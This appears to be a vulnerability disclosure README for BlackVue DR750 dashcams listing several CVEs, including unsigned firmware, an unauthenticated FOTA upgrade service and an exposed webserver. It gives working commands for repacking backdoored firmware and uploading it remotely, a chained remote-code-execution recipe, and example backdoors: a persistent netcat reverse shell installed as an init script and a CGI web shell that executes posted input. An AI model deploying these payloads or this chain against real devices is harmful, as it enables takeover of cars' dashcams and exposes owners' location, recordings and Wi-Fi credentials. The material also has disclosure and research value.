# BlackVue DR750 CVEs (+ more)

The below is for educational purposes only, do not try this on any device you do not own or have permission to use.

As of writing, there are about ~300 vulnerable BlackVue devices online, which can easily be discovered and exploited.

## No Firmware Authentication Check (*CVE-2023-27748*)
There is no authenticity check for the firmware, which allows an malicious attacker to upload a custom firmware.
This custom firmare can include backdoors, or whatever the attacker wishes to do.

Doing this is fairly simple:

1. Download a firmware file from BlackVues website
2. Unpack the `.zip` containing the firmware files
3. Unpack the image `patch_<dashcam_name>.bin`
4. Change/add the files wanted (check [Example Backdoors](#example-backdoors))
5. tar.gz the image again
6. Calculate the sue checksum for the new `patch_<dashcam_name>.bin` (check [sue_checksum](software/sue_checksum))


```bash
# downloaded from https://blackvue.com/download/dr750-2ch-lte-firmware-multilanguage/
$ unzip dr750-2ch-lte-v1.012-eng.zip
$ cd BlackVue/System/upgrade
$ mkdir patch-out
$ tar -C patch-out -xvzf patch_DR750LTE.bin
# make changes in patch-out
$ tar -C patch-out -czvf patch_DR750LTE.bin .
$ python3 ~/code/blackvue-cve-2022/software/sue_checksum/sue_checksum.py patch_DR750LTE.bin patch_DR750LTE.bin.sue
$ cd ../../../
```

Then just place the folder `BlackVue` on the SD card of the dashcam, and it will start running it.

If creating a firmware for FOTA, then there is a need to create a `.tgz` file of the `System` directory.

```bash
$ tar -C BlackVue/System -czvf fwupgrade.tgz
```

This file can then be used later, to upload a custom firmware using FOTA, and compromise a dashcam fully.


## Unauthenticated FOTA (firmware over the air) protocol (*CVE-2023-27748*)
The BlackVue dashcams will listen on port `9771/TCP`, where the FOTA (firmware over the air) service is running.
This service allows to ping, restart, get device time, upgrade firmware, etc.

There is nothing protecting this endpoint, and it can be accessed if on the same network as the dashcam, or if it is a LTE connected device it can be accessed from the internet, which is not ideal.
A python script which can communicate with the FOTA service, can be found [here](software/fota/fota.py).

Create a new firmware based on the steps from the previous section, and upload it using.

```bash
python software/fota/fota.py 10.0.0.1 upgrade /tmp/fwupgrade.tgz
```

This utility comes with no guarantee that it works, but it has worked once before. 

## Insecure default Wi-Fi password (*CVE-2023-27746*)
The default Wi-Fi password for the dashcam is only lowercase alphanumeric characters, with a length of 8.
It is possible to intercept a handshake from the dashcam, and use tools from aircrack to calculate the password (if the user has not changed it).
This can be done in approx ~4 days, when using rented hardware.

## Unauthenticated webserver (*CVE-2023-27747*)
By default the webserver can be accessed without any information, which exposes various endpoints

```
├── blackvue_live.cgi
├── blackvue_livedata.cgi
├── blackvue_vod.cgi
├── Config
├── index.html
├── Record
└── upload.cgi
```

These endpoints allow the following:

1. Livefeed of the dashcam
2. Livedata feed (position, speed, etc.)
3. Download all recordings from the dashcam
4. Upload own custom config to the dashcam
5. Download the current config from the dashcam
5.1. This includes potential Wi-Fi information that can be decrypted (see above)


## No firewall (*CVE-2023-27748*)
The dashcams does not come with any firewall enabled, which might not be an issue if the dashcam is only connected to the Wi-Fi.
However, the LTE version is connected directly to the internet, and as some mobile providers does not have a firewall setup and does not put their users behind a NAT, then the dashcam is directly connected to the internet.
This can be verified by looking at the extracted firmware.

At the very least the BlackVue dashcams with LTE should block connections on the LTE side.

## Insecure storage of Wi-Fi password on SD-card
The Wi-Fi SSID and password of the network the dashcam will connect to, is stored on the SD-card in the dashcam.
It is however encrypted, but the key is fairly easy to get if reverse engineering the app.

Checkout [wifi-decrypt.py](software/wifi-decrypt/wifi-decrypt.py).

It is also worth noting, when changing the Wi-Fi the dashcam should connect to, then these values are sent to BlackVues servers, which will store them until they can send the information to the dashcam.
If these data are deleted upon the dashcam becoming available is unknown.


## Combining these attacks
All these can be combined into simple RCE, especially with the LTE dashcams.

1. Craft a custom firmware with a backdoor
2. Use fota.py to upload the firmware remotely
3. Connect to backdoor
4. ???
5. Profit


## Example backdoors

### Netcat
`/bin/backdoor.sh`
```sh
#!/bin/sh
IP=$1
PORT=$2

while /bin/true; do
    /usr/bin/nc $IP $PORT -e /bin/sh
done
```

`/etc/init.d/S85backdoor`
```sh
#!/bin/sh
/bin/backdoor 10.99.77.20 1745 &
```

### `cmd.cgi`
`/res/System/www/cmd.cgi`
```sh
#!/bin/sh

echo "Content-type: text/html"    # set the data-type we want to use
echo ""

POST_STRING=$(/bin/cat)
echo $POST_STRING
exec $POST_STRING
```
